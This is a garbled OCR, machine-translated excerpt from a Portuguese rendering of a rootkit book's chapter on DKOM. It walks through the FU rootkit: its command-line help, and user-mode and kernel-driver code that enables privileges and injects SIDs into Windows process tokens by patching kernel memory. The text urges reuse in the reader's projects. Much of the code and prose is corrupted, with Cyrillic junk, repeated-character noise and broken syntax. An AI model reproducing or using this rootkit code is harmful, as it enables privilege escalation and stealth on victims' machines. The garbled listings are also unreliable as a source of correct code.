Código Rutkin Eu recomendo baixar do site www.r o t k i t.com (http: / / 
w w w.r o t k i t.C o m / v a u l t / f u z e n _ o p / f u _ r o t k i t.fecho eclair). 
Fu consiste em dois componentes: 
• 
Usuário (programa fu.exe); 
• 
Drivers do dispositivo (arquivo msdirectx. Sys). 
O componente do usuário foi projetado para controlar o driver 
dispositivos.Enquanto Rutkin Fu só pode ocultar os processos e mudar 
Seus poderes.Por exemplo, para alterar os poderes do processo do PID 113 
O comando é usado: 
FU -PRS 113 <Lista de_ priviliges (através da lacuna)> 
Privilégios são definidos pelos argumentos da linha de comando - linhas,
Contando do prefixo "SE".Listagem 13.12 mostra um fragmento de arquivo 
f u.C p. 
Listagem 13.12.Preenchendo uma variedade de privilégios com Rutkito Fu 
Char *priv_array = null; 
// pensamos que 
O tamanho de cada elemento da matriz é de 32 bytes. 
// Este é o tamanho máximo: não sabemos com antecedência exatamente quanto 
privilégios 
// precisará ser instalado 
Priv_array = (char *) calloc (argc-3, 
32); 
285

pagina: 285

Rootkits 
i n t s i z e = 0; 
f o r (i n t 
i = 3;i <a r g c; 
i ++) 
{ 
i f (s t r n c m p (r g v [i], 
"SE", 
2) == 0) 
{ 
strncpy ((char *) priv_array + ((i-3) *32) 
tamanho ++; 
argv [i], 31) 
status = setPriv (PID, priv_array, tamanho*32); 
if (status == 0) 
{ 
Impressorror 
("Contexto 
processo 
privilégio 
Getlasterror () 
); 
fracassado. 
C: \ Windows \ System32 \ cnrkl.ehe 
Microsoft Windows XP [ври S.1.26001 
К коорпораций маййроitivamente, 1985-2001. 
D: v? 7?> Fu ajuda 
Uso: 
fu 
I-PLL Ununbl-i ' 
t-j »h]« pid 
t-piai 
a* 
t- p l l 
ttnunbei* 
para eu ser o número de processos 
t-j »h] 
ttpid 
para esconder o processo com «pid 
T-PLDL 
para os motoristas nomeados em dbguieu 
t-phdl driuer_nar1e para esconder o driver nomeado 
T-Pasj 8pid 
Para definir o ftuth_i »como svsieh no processo« pid 
I-prlj 
para os privilégios disponíveis 
t - p r s l ttpid ttprivilege_name para definir privilégios no processo #pid 
F-Posl ttpid ttacCottnt_nane para adicionar ItAccount_Name SID para processar o token TTPID 
D: \ ?? 7> _ 
Р.13.8.Pers 
° de fevereiro 
S e t p r i v 
ы ыеяiHе патт дя мааааperar 
тркр к deve 
Luid_and_attributes и ivel иициаferiri зирgre. 
typedef struct _luid_and_attributes { 
Luid Luid; 
Atributos de dWord; 
} Luid_and_attributes, *pluid_and_attributes; 
LUID (identificador único localmente exclusivo) - ээо.ipar 
, значение, manten з з п п п з з glьн з з nh з п п з nh з п nt п п п п п п п п з nh з з з grelth п п п п п п п nt з з з з grel. 
Não.LUID мжжÉI з з зеееесс п м з з з з еееееес з м з з з ееее з м з еееееее з з еееее з з зеееее з зееееееее зееееее з зеееее зеееее з з зÉ зе з з з зее з зее зеееее зее зеееее зе з зееееее з зее з зе з зе з зе з зе з зе з зе з зе з зе з зе з зе з з edade 
Дл полчÉI н теещщ Pora
LegeValue, которой нжно передать iada 
286

pagina: 286

Capítulo 13. Tecnologia DKOM 
privilégios e um ponteiro para a variável do tipo Luid, que será registrada
Sano obtido. 
Na estrutura de luid_and_attributes, como fica claro em seu nome, exceto luid 
Privilégios armazenados um pouco de seus atributos: 
• Defina SE_PRIVILEGE'_DISABLED OXOOOOOOOOOL 
• Definir 
SE_PRIVILEGE_ENABLED_BY_DEFAULL OXOOOOOLL 
• Definir SE_Privilege_enabled 0 x 0 0 0 0 0 0 2 L 
Depois que a variedade de privilégios é preenchida, um usuário
Um grama usando deviceLocontrol se volta para o driver Rutkit, por
Ele é um código de controle bruto I0CTL_R00TKIT_SETPRIV (Listagem 13.14). 
Listagem 13.13.Instalação de privilégios Rutkito Fu 
DWORD SETPRIV (DWORD PID, VOID *PRIV_LUIDS, INT PRIV_SIZE) 
{ 
// pid 
- pid 
um processo cujos privilégios devem ser alterados; 
// priv_luids - uma variedade de privilégios especificados pelo usuário 
// priv_size - tamanho da matriz 
Dword d_bytesread; 
DWord sucesso; 
// Matriz de privilégios e 
seus atributos 
Pluid_and_attributes pluid_array; 
Luid Pluid; 
Vars Dvars; 
se (! Inicializado) 
{ 
// dispositivo (driver) não está pronto 
Erro de retorno não 
Preparar; 
if (priv_luids == null) retorna error_invalid_address; 
Pluid_array = (pluid_and_attributes) calloc (priv_size/32, 
Sizeof (luid_and_attributes));. 
if (pluid_array == null) retornar error_not_enough_memory; 
Dword real_luid = 
0; 
para (int 
EU 
= 0; 
I <private_size/32; 
I ++) 
{ 
If (lookupprivilegeValue (nulo, 
(char *) priv_luids + (i *3.2), spluid)) 
{ 
Memcpy (pluid_array+i, spluid, sizeof 
(Luid)); 
(*(PLUID_ARRAY+I)) 
SE_PRIVILEGE_ENABLED_BY_DEFAULT; 
Luid real ++; 
287

pagina: 287

Rootkits 
// preencha a estrutura para transmitir o driver 
dvars.the_pid = pid;// Processo PID 
dvars.pluida = pluid_array;// privilégios 
dvars.num_luids = real_luid;// o número deles 
// Ligue para o driver do dispositivo 
Sucesso = deviceLocontrol (gh_device, 
Ioctl_rootkit_seetpriv, 
(Void *) sdvars, 
Sizeof (dvars), 
Nulo, 
0, 
Sd_bytesread, 
Nulo); 
// Liberte a memória 
if (pluid_array) grátis (pluid_array); 
Sucesso de sucesso; 
} 
No driver msdirectx.O SYS implementou um manipulador para ooctl_rootklt_ 
Setpriv.Este manipulador encontra a estrutura PID do processo de eProcess, 
cujos privilégios precisam ser alterados (FindProcesseproc) e em 
Essa estrutura é o endereço do token de privilégios (função FindProcessToken). 
Você pode estudar o código dessas funções e usá -lo em seus projetos. 
Portanto, quando temos um endereço de token, podemos começar a modificá -lo. 
Mas primeiro precisamos descobrir o tamanho da matriz luid_and_attributes,
segurando em token (exatamente o que está em token, e não na matriz que 
Entregamos ao motorista).Para fazer isso, devemos ler o significado, encontrando
Slicking de acordo com o deslocamento de 0x48 no XP SP1 (este é um medidor de contra -privilégios, consulte a Tabela 13.3) 
Ou em outro endereço - dependendo da versão do Windows.Este é um significado 
É muito importante para nós. 
Depois disso, precisamos do endereço da matriz Luid_and_attributes 
(O que está em token).Eu lembro que o token consiste em duas partes: partes 
com tamanho constante e parte com tamanho variável.Mudanças
A parte começa imediatamente atrás da parte permanente.O começo da matriz 
Luid_and_attributes - Este é o início de uma peça variável. 
Quando temos um endereço de uma variedade de privilégios e o valor de seu contador, nós 
Podemos seguir em frente.Não temos o direito de adicionar novos privilégios, 
Alterando o tamanho da matriz, porque corremos o risco de substituir a Sistêmica importante 
Dados localizados imediatamente após nosso token.Para isso 
Não aconteceu, não vamos mudar o tamanho do token, mas apenas tente 
Instale atributos de privilégios: se o privilégio que precisamos for desligado, 
Vamos ativá -lo. 
288

pagina: 288

Capítulo 13. Tecnologia DKOM 
Você provavelmente pensou que se não houvesse luid_and_attributes na matriz 
O privilégio ordenado pelo usuário, então não poderemos ativá -lo?Esse 
Não é assim.Veja: O processo tem muitos -OFFs -
Funciona bem sem eles.Podemos substituir um deles necessário 
privilégio e, em seguida, altere seu atributo para SE_enabled_by_defult. 
Para fazer isso, em Rutkin Fu, existem dois ciclos.O primeiro ciclo está cruzando a matriz 
Luid_and_attributes em busca do privilégio ordenado e inclui, 
Se já estiver presente.O segundo ciclo é colocado em uma variedade de privilégios, 
Que no token ainda não está (listando 13.14). 
Listagem 13.14.Fragmento de código do driver, incluindo e substituindo privilégios 
// Se houver um novo privilégio no token, apenas mudamos 
Atributos 
para (luid_attr_count = 
0;luid_attr_count < 
I_privcount;luid_attr_ 
Contagem ++) 
{ 
para (i_luidsmed = 
0; 
I_luidsmed < 
nluids;i_luidsmed ++) 
{ 
se 
( 
(luids_at.tr 
[I_luidsmed] 
.Attributes! = 
Oxffffffff) 
&& 
(Memcmp (& luids_attr_orig [luid_attr_count] .luid, 
& luids_attr [i_luidsmed] .luid, sizeof (luid)) == 0)) 
{ 
luids_attr_orig [luid_attr_count] .attributes = 
luids_attr [i_luidsmed] .attributes; 
luids_attr [i_luidsmed] .attributes = oxfffffffff; 
} 
) 
// 
Nós 
Não 
Encontrado nos privilégios do token que queremos estabelecer: 
// 
Vamos tentar 
mudar 
existir 
kit 
privilégios. 
Retiro 
// Desativou os privilégios necessários e alterá -los 
Atributos 
para (i_luidsmed = 
0; 
I_luidsmed <nluids;i_luidsmed ++) 
{ 
if (luids att [i luidsmed] .Attributes! = 
Oxffffffff) 
Nós 
para (luid_attr_count = 
0; 
luid_attr_count <i_privcount; 
luid_attr_count ++) 
( 
// 
Nós 
Não 
Sempre seremos capazes de adicionar tudo 
Nós precisamos 
poderes 
-
// v 
Token pode não 
Espaco suficiente. 
se 
( 
(luids_attr [i_luidsmed] 
.Attributes! = 
Oxffffffff) 
&& 
(luids_attr_orig [luid_attr_count] .attributes == 
0x00000000)) 
10 Zak 665 
289

pagina: 289

Rootkits 
} 
} / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / 
} / / se 
} / / para 
luids_attr_orig [luid_attr_count] .luid = 
luids_attr [i_luidsmed] .luid; 
luids_attr_orig [luid_attr_count] .attributes = 
luids_attr [i_luidsmed] .attributes; 
luids_attr [i_luidsmed] .attributes = oxfffffffff; 
// 
se 
para 
13.7.4.Adicionando SID ao token 
A estrutura que descreve SID é como a estrutura de luid_and_attributes: 
Typedef struct _sid_and_attributes { 
Psid sid; 
Atributos de dWord; 
} Sid_and_attributes, *psid_and_attributes; 
Adicionar SID a um token é mais difícil do que ativar ou substituir um privilégio: 
terá que adicionar um ou mais elementos à matriz 
S id_and_attributes, além de mudar todos os sinais no token para 
Apresente -os com as mudanças na memória. 
Para não se enganar, é melhor destacar a memória de um certo 
Tamanho - para escrever uma parte variável do token nele.Tchau 
Você pode até distinguir a memória na área descarregada.Quando formação 
A nova parte variável do token será concluída, você simplesmente reescreverá 
A parte variável existente do domínio da nova parte variável.Nós 
Também será necessário: 
• 
privilégios e medidores de SID; 
• 
SID endereços e privilégios; 
• 
O endereço inicial e o tamanho da parte variável do token. 
O próximo código (Listagem 13.15) inicializa as alterações acima
destaca -se e distingue o lugar na nova parte variável do token em 
memória. 
Listagem 1 3.15.Fragmento do código do motorista preparando o token para adicionar SID 
// Token - Endereço do token 
// PrivCountOffset - Deslocamento do medidor de privilégio (consulte a Tabela 13.3) 
// SidCountOffset - 
O deslocamento do contador 
Sid 
290

pagina: 290

Capítulo 
13. 
Tecnologia DKOM 
PrivCount 
= 
hortelã 
*) (símbolo 
+ 
PrivcountOffset);// 
contador 
privilégios 
SidCount = Mint *) (token + SidCountOffset); 
// Counter Sid 
// Calcule o endereço da tabela Luid e os atributos dos privilégios. 
// 
Esse 
O mesmo endereço é o início da parte variável do token (variável 
VPART) 
// Privaddroffset - Este é o deslocamento do endereço da tabela de privilégios: 
// (0x50 - nt4, 0x64 - w2k, 0x68 - hp1, 0x74 - hp2, 0x74 - 2003 
luids_and_attr = mpluid_and_attributes *) 
(Token + 
Privaddroffset); 
vPart = (pvoid) luids_and_attr; 
// calcule o comprimento da parte variável 
// PrivCountOffset é um deslocamento do medidor de privilégio (Tabela 13.3) 
vpart_len = hortelã *) (token + privcountoffset + 
4); 
// Endereço da tabela SID 
Old_sid_ptr = mpsid_and_attributes *) (token + 
Sidaddroffset); 
// Eu destaquei a memória para a colocação temporária da parte variável 
var_part = exallococool (PAGEDPOOL, VPART_LEN); 
if (var_part == null) 
{ 
Ostatatus-> status = status_insobility_resources; 
Quebrar; 
} 
Rtlzeromemery (var_part, vpart_len); 
Então, para salvar a memória atribuída ao token, copiamos 
A área temporária são apenas privilégios ativos.Afinal, ainda precisamos de um BO
As crianças escrevem o novo SID e fazem alterações na tabela sid_and_at
Tributos, dos quais o último pode crescer em tamanho. 
Obviamente, a probabilidade de não termos espaço suficiente para gravar a tabela 
Sid, ainda há.Se isso aconteceu, você tem várias opções
CamaradaA maneira mais fácil é retornar ao componente do usuário do Rutkit um erro, 
Referindo -se à falta de memória. 
O segundo método é liberar o local do token sob o novo SID. 
O local pode ser libertado reescrevendo o SID algum ativo quando
Villigy.Você precisa ter cuidado aqui - você precisa saber o que pode 
Retolle, mas o que é impossível.Se você reescrever o privilégio,
O processo, então o processo não funcionará corretamente (se é 
Funcionará - provavelmente, o processo é emergência para concluir seu trabalho). 
Há também uma terceira maneira.Não consideraremos sua implementação, mas 
Você deve conhecer o princípio geral.Começando com o Windows 2000, o token tem 
Não apenas poderes desconectados, mas também proibiu Sid.Devido a eles 
Você pode aumentar o lugar no token.SIDs proibidos são usados ​​raramente, 
Portanto, não deve haver consequências especiais para o sistema. 
291

pagina: 291

Rootkits 
Agora vamos prosseguir para a implementação prática do primeiro método.Eu denovo 
Repito que não consideraremos o segundo e o terceiro. 
Listagem 1 3.16.Fragmento do código do motorista adicionando um novo SID 
// Copiar apenas privilégios ativos.Desligou os privilégios 
// será reescrito 
para (luid_count = 
0; 
luid_count <privado;luid_count ++) 
( 
if (((pluid_and_attributes) vpart) [luid_count] .attributes! = 
SE_PRIVILEGE_DISABLED) 
{ 
((Pluid_and_attributes) var_part) [i_luidsmed] .luid = 
((PLUID_AND_ATTRIBUTES) VPART) [LUID_COUNT] .LUID; 
((Pluid_and_attributes) var_part) [i_luidsmed] .attributes = 
((PLUID_AND_ATTRIBUTES) VPART) [LUID_COUNT] .ATTRIBUTES; 
Luidsmed ++;// 
Contador de privilégios copiados 
) 
} 
// calcule o tamanho da memória necessária para 
Posicionamento do token. 
// tamanho da matriz SID 
Calculado em 
parte do usuário da raiz 
E 
// transmitido a Rutkin de 
Ioctl.Você pode pegar o tamanho de Sid como este: 
// LookUpAccountName (NULL, SNAME, MY_SID, & D_SIDSIZE, LP_DOMNAME, 
// 
& d_domsize, sid_use); 
// Exemplo visual você 
Encontre em 
Fuil fu.prr rutkin 
Fu 
SpacacacEneeded = Sidsize + 
sizeof (sid_and_attributes); 
Espaciais 
* 
Sizeof (luid_and_attributes); 
SpaceUsed = Luidsmed * 
Sizeof (luid_and_attributes); 
IF (Spacesaved <SpacacacEneeded) 
{ 
EXFREEPOOL (VARPART) 
; 
// não há espaço suficiente para 
Registros 
Sid 
Ostatatus-> status = status_insobility_resources; 
Quebrar; 
// Copiar tudo 
A estrutura de sid_and_attributes existentes no token 
// em 
Região temporária 
Rtlcopymemory ( 
(Pvoid) 
((DWORD) VAR_PART 
+ 
SPACEMED) 
, Assim, 
(Pvoid) 
((DWORD) VPART + (privcount * sizeof (luid_and_ 
Atributos))), 
SidCount * sizeof (sid_and_attributes) 
); 
para (int 
Sid_count = 
0; 
Sid_Count <SidCount;Sid_count ++) 
( 
292

pagina: 292

Capítulo 
13. 
Tecnologia 
Dkom 
( 
(Psid_and_attributes) ((dword) var_part + 
(SpaceUsed))) [sid_count] .attributes = 
Old_sid_ptr [sid_count] .attributes; 
((Psid_and_attributes) ((dword) var_part+(spacemed))) 
[sid_count] .sid = 
(Psid) (((dWord) Old_sid_ptr [sid_count] .sid) -
((DWORD) SPACESEDED) + 
((DWORD) tamanhoof 
(Sid_and_attributes)))); 
) 
// Calcule o novo tamanho da lista SID 
// depois de adicionar um novo SID ao final da lista 
Sizeoflastsid = (dWord) VPart + variablelen; 
Sizeoflastsid = sizeoflastsid -
(DWord) ((psid_and_attributes) old_sid_ptr) [sidcount-1] .sid; 
((Psid_and_attributes) ((dword) var_part+(spacemed))) [SidCount] .sid 
(Psid) ((dword) ((psid_and_attributes) ((dword) varpart + 
(SpaceUsed)))) 
[SidCount-1] 
.Sid + 
Sizeoflastsid); 
// 
Instalar 
Atributos 
Novo 
Sid. 
Significado 
0x00000007 
corresponde 
// Bandeira obrigatória 
((Psid_and_attributes) ((dword) var_part + 
(SpaceUsed))) [SidCount] .Attributes = 0x00000007; 
// Copie uma nova peça variável do armazenamento temporário 
// para o token existente 
Sizeofoldsids = (dword) vpart + vpart_len; 
Sizeofoldsids = sizeofoldsids -
(DWord) ((psid_and_attributes) old_sid_ptr) [0] .sid; 
Rtlcopymemory ( 
(Void inalignado *) ((dWord) var_part + 
(Spacemed) 
+ 
( 
(SidCount 
+ 
1)*sizeof (sid_and_attributes))), 
(Constation vod inalignado *) ((dWord) VPart + 
(Privcount*sizeof (luid_and_attributes))+ 
(SidCount*sizeof (sid_and_attributes))), 
Sizeofoldsids 
); 
Rtlzeromemery (vPart, vpart_len); 
Rtlcopymemory (vPart, var_part, vpart_len); 
// Copie o novo SID no final da lista SID 
Rtlcopymemory ( 
( 
(Psid_and_attributes) 
((DWORD) VPART 
+ 
(SpaceUsed))) [SidCount] .sid, 
PSID, SIDSIZE 
); 
// modifica os contadores e sinais da parte estática do token 
Hortelã *) 
(token + sidcountOffset) + = 1; 
Hortelã *) 
(Token + privCountOffset) = luidsmed; 
Mpsid_and_attributes *) (token + sidaddroffset) " 
(Psid_and_attributes) ((dword) vpart + (spacemed)); 
Exfreepool (var_part); 
293

pagina: 293

Rootkits 
Neste capítulo, examinamos como com a ajuda do DKOM você pode esconder
Cessos e mudam seus poderes.Mas isso não é um limite para o DKOM.Usando 
Esta técnica pode ser feita muito mais - ocultar portas de rede 
e compostos, enganam os meios de protocolar o sistema e muito 
Outro.Tudo isso permanece para você em um estudo independente. 
Ao modificar os objetos do sistema, você deve descobrir por que 
Este ou esse objeto é usado.Se não há nada na documentação sobre ele 
Dizem que você será ajudado por Windbg, Softlce, Ida Pro Kernel. 
294

pagina: 294

Grupo de publicação de preparação: 
Cabeça.O editor da literatura de computadores: M.V.Finkov 
Editor: O.I.Berezkina 
Correladores: E.E.Kirillov, N.B.Sirazitdinova 
LLC "Ciência e Técnica" 
Licença nº 000350 de 23 de dezembro de 1999. 
198097, São Petersburgo, ST.Marshal Govorov, d. 
Assinado para imprimir 19/06/2006.Formato 70x100 1/16. 
Papel de jornal.Impressão offset.Volume 20 p. 
Circulação 3000. Ordem 6
6
5 
Impresso de transparências prontas -feitas no livro técnico do OJSC 
190005, São Petersburgo, Izmailovsky Pr., 29.

pagina: 295
